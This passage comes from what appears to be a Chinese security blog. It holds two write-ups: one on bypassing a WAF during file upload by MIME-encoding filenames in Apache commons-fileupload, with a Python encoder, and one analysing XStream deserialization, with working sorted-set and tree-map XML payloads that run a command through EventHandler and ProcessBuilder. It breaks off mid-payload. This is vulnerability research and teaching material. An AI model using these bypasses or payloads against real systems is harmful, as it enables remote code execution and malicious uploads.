(org.apache.commons.fileupload)</span><br><span class="line">&lt;init&gt;:988, FileUploadBase$FileItemIteratorImpl </span><br></pre></td></tr></table></figure><p>这里有个到 <code>Character.isWhitespace</code>，也就是@我是killer师傅提到的点，也是我们开篇前言中说到的利用方式，就不多提了<img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/4.png"></p><h2 id="正文开启"><a href="#正文开启" class="headerlink" title="正文开启"></a>正文开启</h2><p>看看<code>getFileName</code>调用前，其实传入了一个<code>headers</code>，这个<code>headers</code>来源于上面的<code>this.multi</code></p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/6.png"></p><p>而这个<code>multi</code>来源，还与我们上面的<code>bundary</code>有关</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/7.png"></p><p>继续回到上面的getFileName之前<code>this.boundary = FileUploadBase.this.getBoundary(contentType);</code></p><h2 id="失败的绕waf点"><a href="#失败的绕waf点" class="headerlink" title="失败的绕waf点"></a>失败的绕waf点</h2><p>从这里可以看到和上面getFileName的分隔符不一样，这里用了两个分隔符，那么这里我就在想如果getFileName那里如果和这个逻辑不相关岂不是可以拿下</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/5.png"></p><p>我们知道上面getFileName的参数来源于<code>org.apache.commons.fileupload.MultipartStream#readHeaders</code>，可以看到这里是通过for循环遍历并调用getBytes获取</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/8.png"></p><p>而这个input来源就是我们之前传入的输入流</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/9.png"></p><p>因此这里的绕过思路便是无法奏效，主要原因是，看getFilename这里，分割符只有<code>;</code>，我也是麻了</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/10.png"></p><h2 id="成功的绕waf点"><a href="#成功的绕waf点" class="headerlink" title="成功的绕waf点"></a>成功的绕waf点</h2><p>在<code>org.apache.commons.fileupload.ParameterParser#parse(char[], int, int, char)</code>，</p><p>wow！！，这里对value进行了<code>MimeUtility.decodeText</code>操作</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/11.png"></p><p>我们知道对MIME的编码出现在邮件中，因为 <a href="https://link.segmentfault.com/?enc=E0WYZoou9lOm0BILirE8wQ==.5lWx2MKhWSAYCCwtfGHV3Qs/Mur0A4amgVOQilgG3UozgBpAmDIaUA8olEYP/ELK43p32Wt8Ny3CMJqOn/cXSPAyh/C55MrrJthTEn+nlP9CQAL5VGZBvpX/88iPJRnlQsniI9/pHMS8JdAlBe3gdw==">SMTP 协议一开始只支持纯 ASCII 文本的传输</a>，这种情况下，二进制数据要通过 MIME 编码才能发送</p><p>那我们来看看这个decode里面干了啥,我直接看了下面如果<code>=?</code>开头则会调用decode方法</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/12.png"></p><p>我来对这串又臭又长的代码进行解读，主要是为了符合<a href="https://www.rfc-editor.org/rfc/rfc2047">RFC 2047</a>规范</p><ol><li>要求以<code>=?</code>开头</li><li>之后要求还要有一个<code>?</code>，中间的内容为编码，也就是<code>=?charset?</code></li><li>获取下一个<code>?</code>间的内容，这里与下面的编解码有关</li><li>之后定位到最后一个<code>?=</code>间内容执行解码</li></ol><p>这里我们来一个实例方便理解上面步骤<code>=?gbk?Q?=31=2e=6a=73=70?=</code></p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/13.png"></p><p>从上面的步骤可以看到对指支持两种解码一种是<code>B</code>一种<code>Q</code>，分别对应<code>Base64</code>以及<code>Quoted-printable</code>编码，对于前者大家都很熟悉，对于后者我们这里只说如何编码</p><blockquote><p>Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”=0C”， 等号”=”（十进制值为61）必须表示为”=3D”，gb2312下“中”表示为=D6=D0</p></blockquote><p>因此我们就可以对这个value进行一些编码的骚操作，下面我们来梳理下可利用的点</p><ol><li><p>一个是控制字符串的编码，这里支持编码很多因为是调用<code>new String(decodedData, javaCharset(charset))</code>，这个javaCharset函数预制了一些，可以看到如果不是这里面的就直接返回那个指，而new String函数里面会调用所有java支持的编码格式去解析，也就是<code>charsets.jar</code>里面的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">javaCharset</span><span class="params">(String charset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String mappedCharset = (String)MIME2JAVA.get(charset.toLowerCase(Locale.ENGLISH));</span><br><span class="line">        <span class="keyword">return</span> mappedCharset == <span class="keyword">null</span> ? charset : mappedCharset;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;iso-2022-cn&quot;</span>, <span class="string">&quot;ISO2022CN&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;iso-2022-kr&quot;</span>, <span class="string">&quot;ISO2022KR&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;UTF8&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;utf8&quot;</span>, <span class="string">&quot;UTF8&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;ja_jp.iso2022-7&quot;</span>, <span class="string">&quot;ISO2022JP&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;ja_jp.eucjp&quot;</span>, <span class="string">&quot;EUCJIS&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;euc-kr&quot;</span>, <span class="string">&quot;KSC5601&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;euckr&quot;</span>, <span class="string">&quot;KSC5601&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;us-ascii&quot;</span>, <span class="string">&quot;ISO-8859-1&quot;</span>);</span><br><span class="line">    MIME2JAVA.put(<span class="string">&quot;x-us-ascii&quot;</span>, <span class="string">&quot;ISO-8859-1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>控制<code>Base64</code>以及<code>Quoted-printable</code>去解码</p></li></ol><p>这里来测试一下，对能编码的都编码一遍</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/14.png"></p><p>成功上传怎么说</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/15.png"></p><h2 id="继续增强混淆"><a href="#继续增强混淆" class="headerlink" title="继续增强混淆"></a>继续增强混淆</h2><p>还记得吗，当时说的只会提取<code>=??=</code>之间的内容，那我们在后面加点其他东西也可以，当然<code>boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?=</code>这个不能加，因为他在header头，会造成解析出问题</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/16.png"></p><h2 id="你以为就这就完了？"><a href="#你以为就这就完了？" class="headerlink" title="你以为就这就完了？"></a>你以为就这就完了？</h2><p>再回到<code>org.apache.commons.fileupload.util.mime.MimeUtility#decodeText</code>，这里还有判断<code> \t\r\n</code></p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/17.png"></p><p>直接解释代码有点累了，看图啥都懂了</p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/18.png"></p><h2 id="测试相关代码"><a href="#测试相关代码" class="headerlink" title="测试相关代码"></a>测试相关代码</h2><p>整合在一起了,最后再次感谢<code>@我是killer</code>师傅的文章带给我的思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;test&quot;</span></span><br><span class="line">encode = name.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">b = base64.b64encode(encode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=?utf-8?B?&quot;</span>+b.decode()+<span class="string">&quot;?=&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encode.decode(<span class="string">&quot;gbk&quot;</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).split(<span class="string">&quot;0x&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    res += <span class="string">f&quot;=<span class="subst">&#123;tmp&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=?gbk?Q?&quot;</span>+res+<span class="string">&quot;?=&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XStream反序列化</title>
      <link href="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h1><h2 id="XStream简介"><a href="#XStream简介" class="headerlink" title="XStream简介"></a>XStream简介</h2><p>XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</p><h2 id="反序列化基本原理"><a href="#反序列化基本原理" class="headerlink" title="反序列化基本原理"></a>反序列化基本原理</h2><p>XStream实现了一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><p>当然在这之前简单介绍几个重要的小知识</p><h2 id="EventHandler类"><a href="#EventHandler类" class="headerlink" title="EventHandler类"></a>EventHandler类</h2><p>EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接</p><p>EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invoke</span><span class="params">(Method var0, Object var1, Object[] var2)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> bounce.invoke((Object)<span class="keyword">null</span>, var0, var1, var2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var5) &#123;</span><br><span class="line">            Throwable var4 = var5.getCause();</span><br><span class="line">            <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> InvocationTargetException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (InvocationTargetException)var4;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> IllegalAccessException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (IllegalAccessException)var4;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (RuntimeException)var4;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (Error)var4;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">&quot;Unexpected invocation error&quot;</span>, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">&quot;Unexpected invocation error&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Converter转换器"><a href="#Converter转换器" class="headerlink" title="Converter转换器"></a>Converter转换器</h2><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p><p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现3个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><p>具体参考：<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>当然基本的demo还是要给一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.txt&quot;</span>);</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        xStream.fromXML(fileInputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-sorted-set"><a href="#1-sorted-set" class="headerlink" title="1.sorted-set"></a>1.sorted-set</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>1.4.5，1.4.6，1.4.10</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>经典调用计算器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-na<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在我们来对流程进行追踪，在AbstractTreeMarshallingStrategy.unmarshal()函数中，调用了TreeUnmarshaller.start()函数，即开始解析XML</p><p>我们直接从com.thoughtworks.xstream.core.TreeUnmarshaller#start开始</p><p>发现会调用HierarchicalStreams.readClassType()来获取到PoC XML中根标签的类类型</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p><p>最终在com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClass找到了java.util.SortedSet</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p><p>接着是调用convertAnother()函数对java.util.SortedSet类型进行转换，我们跟进去该函数，其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型<img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p><p>接着看到调用converterLookup.lookupConverterForType()来寻找TreeSet对应类型的转换器，可以看到这里的逻辑是，迭代this.converters，直到找到能转换出TreeSet类型</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p><p>往下调试，在AbstractReferenceUnmarshaller.convert()函数中看到，会调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p><p>之后调用其父类即的FastStack.convert()方法，跟进去，显示将类型压入栈，然后调用转换器TreeSetConverter的unmarshal()方法<img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p><p>往下调试，his.treeMapConverter.populateTreeMap()看英文名就能知道是填充TreeMap，跟进这里先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容填充到Map中</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p>跟进去，发现调用readItem()函数读取标签内的内容并缓存到target这个Map中</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"></p><p>跟入，一直到com.thoughtworks.xstream.mapper.CachingMapper#realClass，现在他就会去寻找这个dynamic-proxy所对应的类</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"></p><p>最后找到这个类</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png"></p><p>接下来回到com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother(java.lang.Object, java.lang.Class, com.thoughtworks.xstream.converters.Converter)，找到这个动态代理类的转换器</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"></p><p>接下来还是调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中<img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"></p><p>之后一直到这里最重要的部分com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal，这里按标签内容生成对应接口的动态代理，此时这个DUMMY是一个空的代理实现</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"></p><p>继续往下执行handler = (InvocationHandler)context.convertAnother(proxy, handlerType);，接下来转换器转换最终得到EventHandler</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png"></p><p>接下来替换代理</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png"></p><p>之后再回到之前的com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap，这里会把结果把存到result</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"></p><p>最终<img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png"></p><p>调用到java.beans.EventHandler#invokeInternal，之后用反射调用ProcessBuilder的start方法触发命令执行</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"></p><h4 id="其他说明"><a href="#其他说明" class="headerlink" title="其他说明"></a>其他说明</h4><p>在小于等于1.3.1版本，运行报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用</p><p>在1.4-1.4.5版本无法触发的原因</p><p>在TreeSetConverter.unmarshal()中，只有当sortedMapField和treeMap不为null时，才能进入populateTreeMap()</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png"></p><p>而在1.4-1.4.4版本中，sortedMapField默认为null，因此无法成功利用,这里以1.4.4版本为例</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"></p><p>在1.4.7-1.4.9版本中，ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤</p><h3 id="2-tree-map"><a href="#2-tree-map" class="headerlink" title="2.tree-map"></a>2.tree-map</h3><h4 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h4><p>版本&lt;=1.4.6或=1.4.10</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>和sorted-map差不多，直接给payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>-na<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        